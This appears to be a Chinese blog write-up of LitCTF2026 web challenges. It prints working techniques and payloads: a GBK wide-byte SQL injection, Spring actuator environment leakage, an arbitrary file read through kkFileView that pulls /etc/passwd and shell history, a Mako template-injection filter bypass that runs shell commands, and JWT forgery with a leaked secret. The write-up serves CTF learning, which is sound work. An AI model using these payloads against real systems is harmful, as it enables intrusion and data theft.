---
title: LitCTF2026-web方向
published: 2026-05-25
description: 不会逆向😭
image: "./9.jpg"
tags: ["CTF"]
category: CTF
draft: false
slug: LitCTF2026
---

## [LitCTF2026] lit_ezsql（solved

打开题目还是挺懵的，一开始尝试的注入都无效

这里要猜到开启调试模式：`debug`

查询：`query?id=1&debug=1`
得到：
```sql
SELECT `id`,`name`,`col2`,`col3`,`col4` FROM `ezsql`.`users` WHERE id='1' LIMIT 50
```

这里输入：`query?id=1%27&debug=1`

得到：

```sql
SELECT `id`,`name`,`col2`,`col3`,`col4` FROM `ezsql`.`users` WHERE id='1\'' LIMIT 50
```

后台执行的不是参数化查询，而是直接将用户的输入拼接进单引号内，并且对 `'` 进行了转义处理

于是这里尝试宽字节注入：
`%df%27`

这里我们从之前的回显结果可以看出，后端是会自动在 `'` 前面生成一个 `\`

于是这里我们的 `%df%27` 得到的结果为 `%df%5c%27`，这里后端若是使用的 gbk 编码的话会将 `%df%5c` 转义为 *運*，随后后面的 `%27` 成功变为 `'`

这里我们尝试 `%df%27%20or%201=1%23&debug=1`，成功执行

接下来就是 union 注入的流程执行即可

（要注意的是可以将 `flag_store` 这个数据库转变为 hex 进制，即可不使用 `'flag_store'` 从而绕过转义处理）

## [LitCTF2026] 华辰企业服务运营平台（solved

看了源码，没什么有效信息，开扫：

```powershell
[10:37:50] 200 -   20B  - /actuator/caches
[10:37:50] 200 -    2KB - /actuator
[10:37:50] 200 -    2B  - /actuator/info
[10:37:50] 200 -   54B  - /actuator/scheduledtasks
[10:37:50] 200 -  749B  - /actuator/metrics
[10:37:51] 200 -   92KB - /actuator/beans
[10:37:51] 200 -   48MB - /actuator/heapdump
[10:37:52] 200 -   47KB - /actuator/loggers
[10:37:52] 200 -    7KB - /actuator/env
[10:37:52] 200 -  268B  - /actuator/health
[10:37:53] 200 -   94KB - /actuator/conditions
[10:37:53] 200 -   29KB - /actuator/mappings
[10:37:55] 200 -    1MB - /actuator/threaddump
[10:38:37] 200 -    1KB - /login
[10:38:37] 200 -    1KB - /login/
[10:38:07] 302 -    0B  - /api/cask/graphql  ->  http://challenge.cyclens.tech:30665/login;jsessionid=58074E73450BED35E8E96F7E0C736E0A
[10:38:07] 302 -    0B  - /api/timelion/run  ->  http://challenge.cyclens.tech:30665/login;jsessionid=A60F5373E401371C4F4407CC909AEF06
[10:38:07] 302 -    0B  - /api/v1  ->  http://challenge.cyclens.tech:30665/login;jsessionid=7DF5A0A42AD45771688F55103327AB44
[10:38:07] 302 -    0B  - /api/proxy  ->  http://challenge.cyclens.tech:30665/login;jsessionid=18F155660A93CC92EAE90AA7D9A8CCC7
[10:38:07] 302 -    0B  - /api/_swagger_/  ->  http://challenge.cyclens.tech:30665/login;jsessionid=870B914374C422B192E3BC64DCB573CE
[10:38:07] 302 -    0B  - /api/swagger/index.html  ->  http://challenge.cyclens.tech:30665/login;jsessionid=46DBDE5F7283F8C86FD5C7CD6E462C95
[10:38:07] 302 -    0B  - /api/v1/swagger.yaml  ->  http://challenge.cyclens.tech:30665/login;jsessionid=B20EBBB16BE394F7A2B8F1705945F60A
[10:38:07] 302 -    0B  - /api/index.html  ->  http://challenge.cyclens.tech:30665/login;jsessionid=C2F4DD1BFB4780A982442BEE82531424
[10:38:07] 302 -    0B  - /api/docs  ->  http://challenge.cyclens.tech:30665/login;jsessionid=0809AE041C091ED1FF48831B34E66AF3
[10:38:07] 302 -    0B  - /api/swagger/static/index.html  ->  http://challenge.cyclens.tech:30665/login;jsessionid=8290F74A9BB7CA85D4EEA47D41043D04
[10:38:07] 302 -    0B  - /api/snapshots  ->  http://challenge.cyclens.tech:30665/login;jsessionid=95A16EBF23402FB07B6BA72F082C93C4
[10:38:07] 302 -    0B  - /api  ->  http://challenge.cyclens.tech:30665/login;jsessionid=1C0CC69FFE2AF6B9A8D6B8A659839EF2
[10:38:07] 302 -    0B  - /api/2/issue/createmeta  ->  http://challenge.cyclens.tech:30665/login;jsessionid=C0721A938C2F5DBA0AD30DDAB7A03AAD
[10:38:07] 302 -    0B  - /api/jsonws  ->  http://challenge.cyclens.tech:30665/login;jsessionid=3E5517F4E99173CFBF5770E9E1883520
[10:38:07] 302 -    0B  - /api/profile  ->  http://challenge.cyclens.tech:30665/login;jsessionid=77AECD654518B51E9EE94B385BAD4972
[10:38:07] 302 -    0B  - /api/v4  ->  http://challenge.cyclens.tech:30665/login;jsessionid=1521A4D9084F680CE57598DD9A41A1C6
[10:38:07] 302 -    0B  - /api/2/explore/  ->  http://challenge.cyclens.tech:30665/login;jsessionid=B42D39F62EE961243B431FEC3A522918
[10:38:07] 302 -    0B  - /api/v2/swagger.yaml  ->  http://challenge.cyclens.tech:30665/login;jsessionid=656A98107A222BF6F4B04ED145B714F7
[10:38:07] 302 -    0B  - /api/__swagger__/  ->  http://challenge.cyclens.tech:30665/login;jsessionid=FC699F1259FDE671B3B2D2E93CB10223
[10:38:07] 302 -    0B  - /api/version  ->  http://challenge.cyclens.tech:30665/login;jsessionid=06515535C72619E3D76364BB587EE427
[10:38:07] 302 -    0B  - /api/swagger-ui.html  ->  http://challenge.cyclens.tech:30665/login;jsessionid=6F05F47AE246D4F2AE8084925B0E3A6D
[10:38:07] 302 -    0B  - /api/apidocs/swagger.json  ->  http://challenge.cyclens.tech:30665/login;jsessionid=E5E0B8B110B7D51820D96E834EEAEB77
[10:38:07] 302 -    0B  - /api/api  ->  http://challenge.cyclens.tech:30665/login;jsessionid=804B08EC5B8D94E73465EC457F252A5A
[10:38:07] 302 -    0B  - /api/swagger/ui/index  ->  http://challenge.cyclens.tech:30665/login;jsessionid=F772A3283E1A021B3FF716B42F7DA1F7
[10:38:07] 302 -    0B  - /api/login.json  ->  http://challenge.cyclens.tech:30665/login;jsessionid=70BAD6F4C5378F2ACB3798EC7661EED1
[10:38:07] 302 -    0B  - /api/  ->  http://challenge.cyclens.tech:30665/login;jsessionid=74B3AA76DEC5497078179710A141A4F6
[10:38:07] 302 -    0B  - /api/jsonws/invoke  ->  http://challenge.cyclens.tech:30665/login;jsessionid=9D9293B4CC699EF137F0C78E4CD8AAB1
[10:38:07] 302 -    0B  - /api/vendor/phpunit/phpunit/phpunit  ->  http://challenge.cyclens.tech:30665/login;jsessionid=21C3B263A3D36A949CB6F0555557F55F
[10:38:07] 302 -    0B  - /api/v2/swagger.json  ->  http://challenge.cyclens.tech:30665/login;jsessionid=3947B398C7DFF08F9BB9C962D259FB7B
[10:38:07] 302 -    0B  - /api/v2/  ->  http://challenge.cyclens.tech:30665/login;jsessionid=4923EF3D5321FDD52B59DC027E77BD21
[10:38:07] 302 -    0B  - /api/v1/  ->  http://challenge.cyclens.tech:30665/login;jsessionid=4BB1C45C79E9971F822DA4CDE983279F
[10:38:07] 302 -    0B  - /api/swagger/swagger  ->  http://challenge.cyclens.tech:30665/login;jsessionid=9EDE4CE98FB8740AA9C20D7115434563
[10:38:07] 302 -    0B  - /api/v1/swagger.json  ->  http://challenge.cyclens.tech:30665/login;jsessionid=E0B2A86B65A1AFA7053D7DC3AE4B9DC8
[10:38:07] 302 -    0B  - /api/v2  ->  http://challenge.cyclens.tech:30665/login;jsessionid=0982C1A4461D3B0C0A335963BA81394B
[10:38:07] 302 -    0B  - /api/docs/  ->  http://challenge.cyclens.tech:30665/login;jsessionid=A1D91179D38B9BC827BE837264E5A1DC
[10:38:07] 302 -    0B  - /api/application.wadl  ->  http://challenge.cyclens.tech:30665/login;jsessionid=327307BDA8982A0795BD69BE11C645AD
[10:38:07] 302 -    0B  - /api/package_search/v4/documentation  ->  http://challenge.cyclens.tech:30665/login;jsessionid=7409ECD0D5675924931D7FE6D4BB2087
[10:38:07] 302 -    0B  - /api/batch  ->  http://challenge.cyclens.tech:30665/login;jsessionid=DE039198D74954C6829A0ED67ED7A6A5
[10:38:07] 302 -    0B  - /api/swagger.json  ->  http://challenge.cyclens.tech:30665/login;jsessionid=0544131923747D12765B18832958789E
[10:38:07] 302 -    0B  - /api/spec/swagger.json  ->  http://challenge.cyclens.tech:30665/login;jsessionid=86CA6431EDB5D86B93631D732D437FC0
[10:38:07] 302 -    0B  - /api/swagger  ->  http://challenge.cyclens.tech:30665/login;jsessionid=7D961820035938039BCDBB623BA69049
[10:38:07] 302 -    0B  - /api/apidocs  ->  http://challenge.cyclens.tech:30665/login;jsessionid=24AD31FA241265E349094FFBC3EA6FF7
[10:38:07] 302 -    0B  - /api/v3  ->  http://challenge.cyclens.tech:30665/login;jsessionid=342F90143283C05EA2D03F192AECA251
[10:38:07] 302 -    0B  - /api/swagger.yml  ->  http://challenge.cyclens.tech:30665/login;jsessionid=8EC3F89EFFD6A98BAB5A2E8175319CD8
[10:38:07] 302 -    0B  - /api/v2/helpdesk/discover  ->  http://challenge.cyclens.tech:30665/login;jsessionid=C5DBA41376D027487B26DA200C4CA27B
[10:38:07] 302 -    0B  - /api/api-docs  ->  http://challenge.cyclens.tech:30665/login;jsessionid=50E169628543CA3F4B279A5472EA7B1E
[10:38:07] 302 -    0B  - /api/swagger.yaml  ->  http://challenge.cyclens.tech:30665/login;jsessionid=D8FDC110FACB558A537861F5671851B9
[10:38:07] 302 -    0B  - /api/whoami  ->  http://challenge.cyclens.tech:30665/login;jsessionid=39974CE847B101E76D27C0781784E694
[10:38:07] 302 -    0B  - /api/config  ->  http://challenge.cyclens.tech:30665/login;jsessionid=3CD1B88B2F1DCA642907F252A5519542
[10:38:08] 302 -    0B  - /api/error_log  ->  http://challenge.cyclens.tech:30665/login;jsessionid=168E2B1142D7833F9BC9F145DBBEF34D
[10:38:20] 302 -    0B  - /dashboard  ->  http://challenge.cyclens.tech:30665/login
[10:38:20] 302 -    0B  - /dashboard/  ->  http://challenge.cyclens.tech:30665/login
```

这里我们通过 `/actuator` 确定了后端是 java 的 spring 框架写的，并且这里暴露了很多信息

```powershell
/actuator/caches
/actuator
/actuator/info
/actuator/scheduledtasks
/actuator/metrics
/actuator/beans
/actuator/heapdump
/actuator/loggers
/actuator/env：记录了所有的环境变量，系统配置等
/actuator/health
/actuator/conditions
/actuator/mappings：当前所有的 web 接口以及后台对应的处理函数
/actuator/threaddump
```

后面发现直接在 `/actuator/env` 里面搜 flag 就出来了

## [LitCTF2026] Northbridge Document Hub（solved

这里题目给出提示：

```powershell
Northbridge 文档中心接入了 kkFileView 兼容的文件预览网关。  
研究员账号已开放，试着从解析缓存里找到本季度财务归档中的 flag。
```

这里我先扫了下：

```powershell
[10:59:13] 200 -    6KB - /;/login
[11:00:37] 302 -    0B  - /assets  ->  /assets/
[11:02:23] 200 -    6KB - /login
```

从 `/;/login` 我们可以知道这里存在一个 “路由解析差异”，从而导致这个和 `/login` 返回同样的界面

这里访问 `/assets/` 我们得到一个自定义后的报错：

```powershell
The requested resource [/assets/] is not available
源服务器未能找到目标资源的表示或者是不愿公开一个已经存在的资源表示。
```

并且我们可以知道它的服务器类型和版本为 `Apache Tomcat/9.0.118`

这里看下源码，找到个 js 文件，进去访问，发现里面泄露了账号和密码：

```powershell
// researcher:Research#2026
```

并且，我们还得到一个任意文件读取接口：

```powershell
fileGateway: {
            path: "/kkfileview/getCorsFile",
            queryKey: "urlPath",
            node: "legacy-parse-02"
        }
```

这里登录进去，发现一个文档 `doc/finance_2026q1.xlsx parse`

很明显，这就是我们要找的财务归档

并且，题目还直接给出了缓存挂载的位置：`/opt/kkfileview/cache/parsed`

这里我们尝试 `url/kkfileview/getCorsFile?urlPath=L2V0Yy9wYXNzd2Q=` 成功

意味着我们要将路径进行 base64 编码（并且使用绝对路径是可以的

这里试了半天直接读取不行（（（

绝对路径貌似走不通

后面使用尝试了读取出题者的命令记录，即 `.bash_history`

得到：

```
cd /opt/kkfileview/bin
./startup.sh --cache.dir=/opt/kkfileview/cache/parsed
java -jar kkFileView.jar --cache.dir=/opt/kkfileview/cache/parsed --forceUpdatedCache=true
cp /opt/kkfileview/cache/parsed/q1_finance_report_2026.zip /tmp/q1_finance_report_2026.zip
```

终于得到文件实际是 `.zip` 而不是 `.xlsx`，并且还被转移到了 `/tmp/` 目录下

最后读取 `/tmp/q1_finance_report_2026.zip` 拿到 flag

## [LitCTF2026] lit_ezssti（solved

看了源码扫了下，没有什么信息

尝试了一下，但是基本上输入的所有东西比如 `{{7*7}}` 它的回显都是你输入的原样

这里的 `.|${` 被过滤了，这里我们就可以想到，`${` 是 python 的 mako 引擎的语法

所以这里猜到应该是 mako 引擎

*题目所提到的工具一把梭我做的时候实在没搞好，这里后面再搞下吧*

（后面发现其实也就过滤了 `.|${|flag`，flag 可以通配符绕过；点号可以使用 `getattr` 进行绕过；`${` 可以使用 `<%` 进行绕过

最终 payload：
```payload
<% import os; getattr(context, 'write')(getattr(getattr(os, 'popen')('cat /fl?g'), 'read')()) %>
```

## [LitCTF2026] lit_reverse_my_web（not solved

要逆向....

这里丢给 ds 跑了半天没跑出来

后面看了下其他师傅的 wp，知道了密钥是：
`rMw_2026_litctf_jwt_secret_key!!`

这里直接伪造就能拿到 flag 了